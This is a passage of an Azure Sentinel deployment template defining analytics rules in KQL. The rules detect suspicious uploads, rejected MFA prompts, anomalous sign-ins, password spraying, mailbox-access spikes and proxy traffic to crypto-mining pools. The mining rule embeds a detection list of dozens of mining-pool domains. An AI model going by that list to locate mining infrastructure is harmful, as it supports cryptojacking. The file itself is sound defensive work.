OperationName =~ \"PutBlob\" or OperationName =~ \"PutRange\"\n  //Parse out the uploader IP\n  | extend ClientIP = tostring(split(CallerIpAddress, \":\", 0)[0])\n  //Extract the filename from the Uri\n  | extend FileName = extract(@\"\\/([\\w\\-. ]+)\\?\", 1, Uri)\n  //Base64 decode the MD5 filehash, we will encounter non-ascii hex so string operations don't work\n  //We can work around this by making it an array then converting it to hex from an int\n  | extend base64Char = base64_decode_toarray(ResponseMd5)\n  | mv-expand base64Char\n  | extend hexChar = tohex(toint(base64Char))\n  | extend hexChar = iff(strlen(hexChar) < 2, strcat(\"0\", hexChar), hexChar)\n  | extend SourceTable = iff(OperationName has \"range\", \"StorageFileLogs\", \"StorageBlobLogs\")\n  | summarize make_list(hexChar, 1000) by CorrelationId, ResponseMd5, FileName, AccountName, TimeGenerated, RequestBodySize, ClientIP, SourceTable\n  | extend Md5Hash = strcat_array(list_hexChar, \"\")\n  //Pack the file information the summarise into a ClientIP row\n  | extend p = pack(\"FileName\", FileName, \"FileSize\", RequestBodySize, \"Md5Hash\", Md5Hash, \"Time\", TimeGenerated, \"SourceTable\", SourceTable)\n  | summarize UploadedFileInfo=make_list(p, 10000), FilesUploaded=count() by ClientIP\n      | join kind=leftouter (\n        union\n        StorageFileLogs,\n        StorageBlobLogs\n        | where OperationName =~ \"DeleteFile\" or OperationName =~ \"DeleteBlob\"\n        | extend ClientIP = tostring(split(CallerIpAddress, \":\", 0)[0])\n        | extend FileName = extract(@\"\\/([\\w\\-. ]+)\\?\", 1, Uri)\n        | extend SourceTable = iff(OperationName has \"range\", \"StorageFileLogs\", \"StorageBlobLogs\")\n        | extend p = pack(\"FileName\", FileName, \"Time\", TimeGenerated, \"SourceTable\", SourceTable)\n        | summarize DeletedFileInfo=make_list(p, 10000), FilesDeleted=count() by ClientIP\n        ) on ClientIP\n  ) on $left.AttackerIP == $right.ClientIP\n| mvexpand UploadedFileInfo\n| extend LinkedMaliciousFileName = tostring(UploadedFileInfo.FileName)\n| extend LinkedMaliciousFileHash = tostring(UploadedFileInfo.Md5Hash)\n| extend HashAlgorithm = \"MD5\"\n| project AlertTimeGenerated = TimeGenerated, LinkedMaliciousFileName, LinkedMaliciousFileHash, HashAlgorithm, AlertType, AttackerIP, AttackerCountry, MaliciousFileDirectory, MaliciousFileName, FilesUploaded, UploadedFileInfo\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "Exfiltration"
          ],
          "techniques": [
            "T1071",
            "T1567"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "b9e3b9f8-a406-4151-9891-e5ff1ddd8c1d",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "AttackerIP"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "HashAlgorithm"
                },
                {
                  "identifier": "Value",
                  "columnName": "LinkedMaliciousFileHash"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4623dd46-b3b7-4663-ac15-8183875e373f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4623dd46-b3b7-4663-ac15-8183875e373f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "MFA Rejected by User",
          "description": "Identifies occurances where a user has rejected an MFA prompt. This could be an indicator that a threat actor has compromised the username and password of this user account and is using it to try and log into the account.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins\nThis query has also been updated to include UEBA logs IdentityInfo and BehaviorAnalytics for contextual information around the results. \nPlease note, MFA Failed logons from known IP ranges can be benign depending on the conditional access policies. In case of noisy behavior, consider tuning the source IP ranges or location filter after careful consideration",
          "severity": "Medium",
          "enabled": true,
          "query": "let riskScoreCutoff = 20; //Adjust this score threshold based on volume of results. Activities identified as the most abnormal receive the highest scores (on a scale of 0-10)\nSigninLogs\n| where ResultType == 500121\n| extend additionalDetails_ = tostring(Status.additionalDetails)\n| extend UserPrincipalName = tolower(UserPrincipalName)\n| where additionalDetails_ =~ \"MFA denied; user declined the authentication\" or additionalDetails_ has \"fraud\"\n| summarize StartTime = min(TimeGenerated), EndTIme = max(TimeGenerated) by UserPrincipalName, UserId, AADTenantId, FailedIPAddress = IPAddress\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n| join kind=leftouter (\n    IdentityInfo\n    | summarize LatestReportTime = arg_max(TimeGenerated, *) by AccountUPN\n    | project AccountUPN, Tags, JobTitle, GroupMembership, AssignedRoles, UserType, IsAccountEnabled\n    | summarize\n        Tags = make_set(Tags, 1000),\n        GroupMembership = make_set(GroupMembership, 1000),\n        AssignedRoles = make_set(AssignedRoles, 1000),\n        UserType = make_set(UserType, 1000),\n        UserAccountControl = make_set(UserType, 1000)\n    by AccountUPN\n    | extend UserPrincipalName=tolower(AccountUPN)\n) on UserPrincipalName\n//Below it will be joined with BehaviorAnalytics table to the Failed IP Addresses\n| join kind=leftouter (\n    BehaviorAnalytics\n    | where ActivityType in (\"FailedLogOn\", \"LogOn\")\n    | where isnotempty(SourceIPAddress)\n    | project UsersInsights, DevicesInsights, ActivityInsights, InvestigationPriority, SourceIPAddress, UserName\n    | project-rename FailedIPAddress = SourceIPAddress, Name = UserName\n    | summarize\n      MaxInvestigationScore = max(InvestigationPriority)  // Only retrieve maximum Investigation Property score for both FailedIP and User\n    by FailedIPAddress, Name)\non FailedIPAddress, Name  // Joining on both IP and User so as to only return context associated with same user\n| extend UEBARiskScore = MaxInvestigationScore\n| project-away *1 // removing duplicate columns post outer join from output\n| where  UEBARiskScore > riskScoreCutoff\n| sort by UEBARiskScore desc \n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "d99cf5c3-d660-436c-895b-8a8f8448da23",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "UserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "FailedIPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/97e3e208-8bdf-4b89-a04a-fae4777375fb')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/97e3e208-8bdf-4b89-a04a-fae4777375fb')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Anomalous sign-in location by user account and authenticating application",
          "description": "This query over Microsoft Entra ID sign-in considers all user sign-ins for each Microsoft Entra ID application and picks out the most anomalous change in location profile for a user within an individual application",
          "severity": "Medium",
          "enabled": true,
          "query": "// Adjust this figure to adjust how sensitive this detection is\nlet sensitivity = 2.5;\n// Adjust this figure to set the value that defines the requested estimation accuracy. The default value is 1. Possible values are 0, 1, 2, 3, 4.\nlet dcountAccuracy = 1;\nlet AuthEvents = materialize(\nunion isfuzzy=True SigninLogs, AADNonInteractiveUserSignInLogs\n| where TimeGenerated between (ago(7d) .. now())\n| where ResultType == 0\n| extend LocationDetails = LocationDetails_dynamic\n| extend Location = strcat(LocationDetails.countryOrRegion, \"-\", LocationDetails.state,\"-\", LocationDetails.city)\n| where Location != \"--\");\nAuthEvents\n| summarize dcount(Location, dcountAccuracy) by AppDisplayName, AppId, UserPrincipalName, UserId, bin(startofday(TimeGenerated), 1d)\n| where dcount_Location > 2\n| make-series CountOfLocations = sum(dcount_Location) on TimeGenerated  step 1d by AppId, UserId\n| extend (Anomalies, Score, Baseline) = series_decompose_anomalies(CountOfLocations, sensitivity, -1, 'linefit')\n| mv-expand CountOfLocations to typeof(double), TimeGenerated to typeof(datetime), Anomalies to typeof(double), Score to typeof(double), Baseline to typeof(long)\n| where Anomalies > 0 and Baseline > 0\n| join kind=inner( AuthEvents | extend TimeStamp = startofday(TimeGenerated)) on UserId, AppId\n| extend SignInDetails = bag_pack(\"TimeGenerated\", TimeGenerated1, \"Location\", Location, \"Source\", IPAddress, \"Device\", DeviceDetail_dynamic)\n| summarize SignInDetailsSet=make_set(SignInDetails, 1000) by UserId, UserPrincipalName, CountOfLocations, TimeGenerated, AppId, AppDisplayName\n| extend Name = split(UserPrincipalName, \"@\")[0], UPNSuffix = split(UserPrincipalName, \"@\")[1]\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "7cb8f77d-c52f-4e46-b82f-3cf2e106224a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "Anomalous sign-in location by {{UserPrincipalName}} to {{AppDisplayName}}",
            "alertDescriptionFormat": "This query over Microsoft Entra ID sign-in considers all user sign-ins for each Microsoft Entra ID application and picks out the most anomalous change in location profile for a user within an\nindividual application. This has detected {{UserPrincipalName}} signing into {{AppDisplayName}} from {{CountOfLocations}} \ndifferent locations.\n"
          },
          "customDetails": {
            "Application": "AppDisplayName"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "UserId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/95a677f9-7993-4bcc-a08b-94d726102468')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/95a677f9-7993-4bcc-a08b-94d726102468')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Distributed Password cracking attempts in Microsoft Entra ID",
          "description": "Identifies distributed password cracking attempts from the Microsoft Entra ID SigninLogs.\nThe query looks for unusually high number of failed password attempts coming from multiple locations for a user account.\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes\n50053   Account is locked because the user tried to sign in too many times with an incorrect user ID or password.\n50055   Invalid password, entered expired password.\n50056   Invalid or null password - Password does not exist in store for this user.\n50126   Invalid username or password, or invalid on-premises username or password.",
          "severity": "Medium",
          "enabled": true,
          "query": "let s_threshold = 30;\nlet l_threshold = 3;\nlet aadFunc = (tableName:string){\ntable(tableName)\n| where OperationName =~ \"Sign-in activity\"\n// Error codes that we want to look at as they are related to the use of incorrect password.\n| where ResultType in (\"50126\", \"50053\" , \"50055\", \"50056\")\n| extend DeviceDetail = todynamic(DeviceDetail), Status = todynamic(DeviceDetail), LocationDetails = todynamic(LocationDetails)\n| extend OS = DeviceDetail.operatingSystem, Browser = DeviceDetail.browser\n| extend StatusCode = tostring(Status.errorCode), StatusDetails = tostring(Status.additionalDetails)\n| extend LocationString = strcat(tostring(LocationDetails.countryOrRegion), \"/\", tostring(LocationDetails.state), \"/\", tostring(LocationDetails.city))\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), LocationCount=dcount(LocationString), Location = make_set(LocationString,100),\nIPAddress = make_set(IPAddress,100), IPAddressCount = dcount(IPAddress), AppDisplayName = make_set(AppDisplayName,100), ResultDescription = make_set(ResultDescription,50),\nBrowser = make_set(Browser,20), OS = make_set(OS,20), SigninCount = count() by UserPrincipalName, Type\n// Setting a generic threshold - Can be different for different environment\n| where SigninCount > s_threshold and LocationCount >= l_threshold\n| extend Location = tostring(Location), IPAddress = tostring(IPAddress), AppDisplayName = tostring(AppDisplayName), ResultDescription = tostring(ResultDescription), Browser = tostring(Browser), OS = tostring(OS)\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "bfb1c90f-8006-4325-98be-c7fffbc254d6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b4d82eb1-62ab-4415-bf6d-56dab4298e94')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b4d82eb1-62ab-4415-bf6d-56dab4298e94')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Exchange workflow MailItemsAccessed operation anomaly",
          "description": "Identifies anomalous increases in Exchange mail items accessed operations.\nThe query leverages KQL built-in anomaly detection algorithms to find large deviations from baseline patterns.\nSudden increases in execution frequency of sensitive actions should be further investigated for malicious activity.\nManually change scorethreshold from 1.5 to 3 or higher to reduce the noise based on outliers flagged from the query criteria.\nRead more about MailItemsAccessed- https://learn.microsoft.com/en-us/purview/audit-log-investigate-accounts",
          "severity": "Medium",
          "enabled": true,
          "query": "let starttime = 14d;\nlet endtime = 1d;\nlet timeframe = 1h;\nlet scorethreshold = 1.5;\nlet percentthreshold = 50;\n// Preparing the time series data aggregated hourly count of MailItemsAccessd Operation in the form of multi-value array to use with time series anomaly function.\nlet TimeSeriesData =\nOfficeActivity\n| where TimeGenerated  between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where OfficeWorkload=~ \"Exchange\" and Operation =~ \"MailItemsAccessed\" and ResultStatus =~ \"Succeeded\"\n| project TimeGenerated, Operation, MailboxOwnerUPN\n| make-series Total=count() on TimeGenerated from startofday(ago(starttime)) to startofday(ago(endtime)) step timeframe;\nlet TimeSeriesAlerts = TimeSeriesData\n| extend (anomalies, score, baseline) = series_decompose_anomalies(Total, scorethreshold, -1, 'linefit')\n| mv-expand Total to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long)\n| where anomalies > 0\n| project TimeGenerated, Total, baseline, anomalies, score;\n// Joining the flagged outlier from the previous step with the original dataset to present contextual information\n// during the anomalyhour to analysts to conduct investigation or informed decisions.\nTimeSeriesAlerts | where TimeGenerated > ago(2d)\n// Join against base logs since specified timeframe to retrive records associated with the hour of anomoly\n| join kind=innerunique (\n    OfficeActivity\n    | where TimeGenerated > ago(2d)\n    | extend DateHour = bin(TimeGenerated, 1h)\n    | where OfficeWorkload=~ \"Exchange\" and Operation =~ \"MailItemsAccessed\" and ResultStatus =~ \"Succeeded\"\n    | summarize HourlyCount=count(), TimeGeneratedMax = arg_max(TimeGenerated, *), IPAdressList = make_set(Client_IPAddress, 1000), SourceIPMax= arg_max(Client_IPAddress, *), ClientInfoStringList= make_set(ClientInfoString, 1000) by MailboxOwnerUPN, Logon_Type, TenantId, UserType, TimeGenerated = bin(TimeGenerated, 1h)\n    | where HourlyCount > 25 // Only considering operations with more than 25 hourly count to reduce False Positivies\n    | order by HourlyCount desc\n) on TimeGenerated\n| extend PercentofTotal = round(HourlyCount/Total, 2) * 100\n| where PercentofTotal > percentthreshold // Filter Users with count of less than 5 percent of TotalEvents per Hour to remove FPs/ users with very low count of MailItemsAccessed events\n| order by PercentofTotal desc\n| project-reorder TimeGeneratedMax, Type, OfficeWorkload, Operation, UserId, SourceIPMax, IPAdressList, ClientInfoStringList, HourlyCount, PercentofTotal, Total, baseline, score, anomalies\n| extend AccountName = tostring(split(UserId, \"@\")[0]), AccountUPNSuffix = tostring(split(UserId, \"@\")[1])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "b4ceb583-4c44-4555-8ecf-39f572e827ba",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserId"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "Client_IPAddress"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIPMax"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/18473637-0bdc-4f4e-93b2-9013e950d0ef')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/18473637-0bdc-4f4e-93b2-9013e950d0ef')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Anomalous Single Factor Signin",
          "description": "Detects successful signins using single factor authentication where the device, location, and ASN are abnormal.\n Single factor authentications pose an opportunity to access compromised accounts, investigate these for anomalous occurrencess.\n Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-devices#non-compliant-device-sign-in",
          "severity": "Low",
          "enabled": true,
          "query": "let known_locations = (SigninLogs\n  | where TimeGenerated between(ago(7d)..ago(1d))\n  | where ResultType == 0\n  | extend LocationDetail = strcat(Location, \"-\", LocationDetails.state)\n  | summarize by LocationDetail);\nlet known_asn = (SigninLogs\n  | where TimeGenerated between(ago(7d)..ago(1d))\n  | where ResultType == 0\n  | summarize by AutonomousSystemNumber);\nSigninLogs\n| where TimeGenerated > ago(1d)\n| where ResultType == 0\n| where isempty(DeviceDetail.deviceId)\n| where AuthenticationRequirement == \"singleFactorAuthentication\"\n| extend LocationParsed = parse_json(LocationDetails), DeviceParsed = parse_json(DeviceDetail)\n| extend City = tostring(LocationParsed.city), State = tostring(LocationParsed.state)\n| extend LocationDetail = strcat(Location, \"-\", State)\n| extend DeviceId = tostring(DeviceParsed.deviceId), DeviceName=tostring(DeviceParsed.displayName), OS=tostring(DeviceParsed.operatingSystem), Browser=tostring(DeviceParsed.browser)\n| where AutonomousSystemNumber !in (known_asn) and LocationDetail !in (known_locations)\n| project TimeGenerated, Type, UserId, UserDisplayName, UserPrincipalName, IPAddress, Location, State, City, ResultType, ResultDescription, AppId, AppDisplayName, AuthenticationRequirement, ConditionalAccessStatus, ResourceDisplayName, ClientAppUsed, Identity, HomeTenantId, ResourceTenantId, Status, UserAgent, DeviceId, DeviceName, OS, Browser, MfaDetail\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "f7c3f5c8-71ea-49ff-b8b3-148f0e346291",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                },
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                }
              ]
            },
            {
              "entityType": "CloudApplication",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AppDisplayName"
                },
                {
                  "identifier": "AppId",
                  "columnName": "AppId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a55a0062-7139-4042-bd56-1f2e3d43c9ca')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a55a0062-7139-4042-bd56-1f2e3d43c9ca')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "NRT",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NRT Squid proxy events related to mining pools",
          "description": "Checks for Squid proxy events in Syslog associated with common mining pools .This query presumes the default Squid log format is being used.\n http://www.squid-cache.org/Doc/config/access_log/",
          "severity": "Low",
          "enabled": true,
          "query": "let DomainList = dynamic([\"monerohash.com\", \"do-dear.com\", \"xmrminerpro.com\", \"secumine.net\", \"xmrpool.com\", \"minexmr.org\", \"hashanywhere.com\", \"xmrget.com\",\n\"mininglottery.eu\", \"minergate.com\", \"moriaxmr.com\", \"multipooler.com\", \"moneropools.com\", \"xmrpool.eu\", \"coolmining.club\", \"supportxmr.com\",\n\"minexmr.com\", \"hashvault.pro\", \"xmrpool.net\", \"crypto-pool.fr\", \"xmr.pt\", \"miner.rocks\", \"walpool.com\", \"herominers.com\", \"gntl.co.uk\", \"semipool.com\",\n\"coinfoundry.org\", \"cryptoknight.cc\", \"fairhash.org\", \"baikalmine.com\", \"tubepool.xyz\", \"fairpool.xyz\", \"asiapool.io\", \"coinpoolit.webhop.me\", \"nanopool.org\",\n\"moneropool.com\", \"miner.center\", \"prohash.net\", \"poolto.be\", \"cryptoescrow.eu\", \"monerominers.net\", \"cryptonotepool.org\", \"extrmepool.org\", \"webcoin.me\",\n\"kippo.eu\", \"hashinvest.ws\", \"monero.farm\", \"supportxmr.com\", \"xmrpool.eu\", \"linux-repository-updates.com\", \"1gh.com\", \"dwarfpool.com\", \"hash-to-coins.com\",\n\"hashvault.pro\", \"pool-proxy.com\", \"hashfor.cash\", \"fairpool.cloud\", \"litecoinpool.org\", \"mineshaft.ml\", \"abcxyz.stream\", \"moneropool.ru\", \"cryptonotepool.org.uk\",\n\"extremepool.org\", \"extremehash.com\", \"hashinvest.net\", \"unipool.pro\", \"crypto-pools.org\", \"monero.net\", \"backup-pool.com\", \"mooo.com\", \"freeyy.me\", \"cryptonight.net\",\n\"shscrypto.net\"]);\nSyslog\n| where ProcessName contains \"squid\"\n| extend URL = extract(\"(([A-Z]+ [a-z]{4,5}:\\\\/\\\\/)|[A-Z]+ )([^ :]*)\",3,SyslogMessage),\n        SourceIP = extract(\"([0-9]+ )(([0-9]{1,3})\\\\.([0-9]{1,3})\\\\.([0-9]{1,3})\\\\.([0-9]{1,3}))\",2,SyslogMessage),\n        Status = extract(\"(TCP_(([A-Z]+)(_[A-Z]+)*)|UDP_(([A-Z]+)(_[A-Z]+)*))\",1,SyslogMessage),\n        HTTP_Status_Code = extract(\"(TCP_(([A-Z]+)(_[A-Z]+)*)|UDP_(([A-Z]+)(_[A-Z]+)*))/([0-9]{3})\",8,SyslogMessage),\n        User = extract(\"(CONNECT |GET )([^ ]* )([^ ]+)\",3,SyslogMessage),\n        RemotePort = extract(\"(CONNECT |GET )([^ ]*)(:)([0-9]*)\",4,SyslogMessage),\n        Domain = extract(\"(([A-Z]+ [a-z]{4,5}:\\\\/\\\\/)|[A-Z]+ )([^ :\\\\/]*)\",3,SyslogMessage),\n        Bytes = toint(extract(\"([A-Z]+\\\\/[0-9]{3} )([0-9]+)\",2,SyslogMessage)),\n        contentType = extract(\"([a-z/]+$)\",1,SyslogMessage)\n| extend TLD = extract(\"\\\\.[a-z]*$\",0,Domain)\n| where HTTP_Status_Code == '200'\n| where Domain contains \".\"\n| where Domain has_any (DomainList)\n",
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1102"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "dd03057e-4347-4853-bf1e-2b2d21eb4e59",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "User"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "URL"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
